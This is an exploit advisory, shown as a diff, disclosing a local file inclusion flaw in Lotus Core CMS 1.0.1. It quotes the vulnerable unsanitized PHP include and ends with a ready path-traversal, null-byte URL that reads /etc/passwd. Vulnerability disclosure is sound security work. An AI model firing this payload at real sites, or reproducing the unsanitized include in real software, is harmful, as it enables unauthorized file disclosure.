@@ -1,0 +1,33 @@
+# Exploit Title: Lotus Core CMS 1.0.1 - Local File Inclusion
+# Google Dork: N/A
+# Date: 2020-01-31
+# Exploit Author: Daniel Monzón (stark0de)
+# Vendor Homepage: http://lotuscore.sourceforge.net/
+# Software Link: https://sourceforge.net/projects/lotuscore/files/latest/download
+# Version: 1.0.1
+# Tested on: Windows 7 x86
+# CVE : N/A
+
+
+The vulnerability occurs on line 65 of the index.php file, first we can provide the page_slug parameter,
+if it's not set by the user it is set to index, but if the user sets the parameter via a GET or POST request,
+it checks if the file exists and if it exists, it performs an unsanitized inclusion.
+
+-----------------------------------------------------------------------------
+
+if(!$_REQUEST['page_slug']){
+	$_REQUEST['page_slug'] = 'index';
+}
+if(file_exists('system/plugins/'.$_REQUEST['page_slug'].'.php') == true){
+	include('system/plugins/'.$_REQUEST['page_slug'].'.php');
+}else{
+	include("system/plugins/error/404.php");
+}
+
+------------------------------------------------------------------------------
+
+
+The PHP file appends .php to anything we provide as page_slug parameter so to include any file we must use a nullbyte.
+Note that you need to be authenticated to exploit this. The explotation would be like this:
+
+http://site:80/index.php?page_slug=../../../../../etc/passwd%00
